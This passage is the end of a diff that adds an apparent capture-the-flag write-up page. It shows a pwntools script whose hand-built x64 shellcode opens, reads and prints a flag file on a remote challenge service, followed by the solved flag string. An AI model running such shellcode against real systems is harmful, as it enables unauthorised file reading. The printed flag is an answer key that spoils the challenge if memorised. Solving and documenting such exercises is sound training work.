+    shellcode += pwn.asm(&quot;xor [rsp], rax&quot;)
+    shellcode += pwn.asm(&quot;mov rax, 0x306f306f306f306f&quot;)
+    shellcode += pwn.asm(&quot;push rax&quot;)
+    shellcode += pwn.asm(&quot;mov rax, 0x3030303030303030&quot;)
+    shellcode += pwn.asm(&quot;push rax&quot;)
+    shellcode += pwn.asm(&quot;mov rax, 0x303030306f6f6f6f&quot;)
+    shellcode += pwn.asm(&quot;push rax&quot;)
+    shellcode += pwn.asm(&quot;mov rax, 0x6f6f6f6f6f6f6f6f&quot;)
+    shellcode += pwn.asm(&quot;push rax&quot;)
+    shellcode += pwn.asm(&quot;mov rax, 0x6f6f6f6f6f6f6f6f&quot;)
+    shellcode += pwn.asm(&quot;push rax&quot;)
+    shellcode += pwn.asm(&quot;mov rax, 0x6f6f6f3030303030&quot;)
+    shellcode += pwn.asm(&quot;push rax&quot;)
+    shellcode += pwn.asm(&quot;mov rax, 0x3030303030303030&quot;)
+    shellcode += pwn.asm(&quot;push rax&quot;)
+    shellcode += pwn.asm(&quot;mov rax, 0x3030303030303030&quot;)
+    shellcode += pwn.asm(&quot;push rax&quot;)
+    shellcode += pwn.asm(&quot;mov rax, 0x303030306f6f6f6f&quot;)
+    shellcode += pwn.asm(&quot;push rax&quot;)
+    shellcode += pwn.asm(&quot;mov rax, 0x6f6f6f6f6f6f6f6f&quot;)
+    shellcode += pwn.asm(&quot;push rax&quot;)
+    shellcode += pwn.asm(&quot;mov rax, 0x6f6f6f6f6f6f6f6f&quot;)
+    shellcode += pwn.asm(&quot;push rax&quot;)
+    shellcode += pwn.asm(&quot;mov rax, 0x6f6f6f6f6f6f6f6f&quot;)
+    shellcode += pwn.asm(&quot;push rax&quot;)
+    shellcode += pwn.asm(&quot;mov rax, 0x6f6f6f6f6f6f6f6f&quot;)
+    shellcode += pwn.asm(&quot;push rax&quot;)
+    shellcode += pwn.asm(&quot;mov rax, 0x6f6f6f6f6f6f6f6f&quot;)
+    shellcode += pwn.asm(&quot;push rax&quot;)
+    shellcode += pwn.asm(&quot;mov rax, 0x6f6f6f6f6f6f6f6f&quot;)
+    shellcode += pwn.asm(&quot;push rax&quot;)
+    shellcode += pwn.asm(&quot;mov rax, 0x6f6f6f6f6f6f6f6f&quot;)
+    shellcode += pwn.asm(&quot;push rax&quot;)
+    shellcode += pwn.asm(&quot;mov rax, 0x6f6f6f6f6f6f6f6f&quot;)
+    shellcode += pwn.asm(&quot;push rax&quot;)
+    shellcode += pwn.asm(&quot;mov rax, 0x6f6f6f6f6f6f6f6f&quot;)
+    shellcode += pwn.asm(&quot;push rax&quot;)
+    shellcode += pwn.asm(&quot;mov rax, 0x6c5f797265765f73&quot;)
+    shellcode += pwn.asm(&quot;push rax&quot;)
+    shellcode += pwn.asm(&quot;mov rax, 0x695f656d616e5f65&quot;)
+    shellcode += pwn.asm(&quot;push rax&quot;)
+    shellcode += pwn.asm(&quot;mov rax, 0x6c69665f6568745f&quot;)
+    shellcode += pwn.asm(&quot;push rax&quot;)
+    shellcode += pwn.asm(&quot;mov rax, 0x7972726f732e656c&quot;)
+    shellcode += pwn.asm(&quot;push rax&quot;)
+    shellcode += pwn.asm(&quot;mov rax, 0x69665f736968745f&quot;)
+    shellcode += pwn.asm(&quot;push rax&quot;)
+    shellcode += pwn.asm(&quot;mov rax, 0x646165725f657361&quot;)
+    shellcode += pwn.asm(&quot;push rax&quot;)
+    shellcode += pwn.asm(&quot;mov rax, 0x656c705f656c6966&quot;)
+    shellcode += pwn.asm(&quot;push rax&quot;)
+    shellcode += pwn.asm(&quot;mov rax, 0x5f67616c665f726b&quot;)
+    shellcode += pwn.asm(&quot;push rax&quot;)
+    shellcode += pwn.asm(&quot;mov rax, 0x2e656c62616e7770&quot;)
+    shellcode += pwn.asm(&quot;push rax&quot;)
+    shellcode += pwn.asm(&quot;mov rax, 0x5f73695f73696874&quot;)
+    shellcode += pwn.asm(&quot;push rax&quot;)
+    shellcode += pwn.asm(&quot;mov rdi, rsp&quot;)
+    shellcode += pwn.asm(&quot;xor edx, edx&quot;)
+    shellcode += pwn.asm(&quot;xor esi, esi&quot;)
+    shellcode += pwn.asm(&quot;push SYS_open&quot;)
+    shellcode += pwn.asm(&quot;pop rax&quot;)
+    shellcode += pwn.asm(&quot;syscall&quot;)
+    shellcode += pwn.asm(&quot;mov rdi, rax&quot;)
+    shellcode += pwn.asm(&quot;xor eax, eax&quot;)
+    shellcode += pwn.asm(&quot;xor edx, edx&quot;)
+    shellcode += pwn.asm(&quot;mov dh, 0x400 &gt;&gt; 8&quot;)
+    shellcode += pwn.asm(&quot;mov rsi, rsp&quot;)
+    shellcode += pwn.asm(&quot;syscall&quot;)
+    shellcode += pwn.asm(&quot;push 1&quot;)
+    shellcode += pwn.asm(&quot;pop rdi&quot;)
+    shellcode += pwn.asm(&quot;xor edx, edx&quot;)
+    shellcode += pwn.asm(&quot;mov dh, 0x400 &gt;&gt; 8&quot;)
+    shellcode += pwn.asm(&quot;mov rsi, rsp&quot;)
+    shellcode += pwn.asm(&quot;push SYS_write&quot;)
+    shellcode += pwn.asm(&quot;pop rax&quot;)
+    shellcode += pwn.asm(&quot;syscall&quot;)
+    attack.recvuntil(&#39;give me your x64 shellcode: &#39;)
+    attack.send(shellcode)
+    print attack.recvall()
+
+if __name__ == &#39;__main__&#39;:
+    main()
+</code></pre><p>Flag</p>
+<pre><code>Mak1ng_shelLcodE_i5_veRy_eaSy
+</code></pre>
+</body>
+</html>
+<!-- This document was created with MarkdownPad, the Markdown editor for Windows (http://markdownpad.com) -->
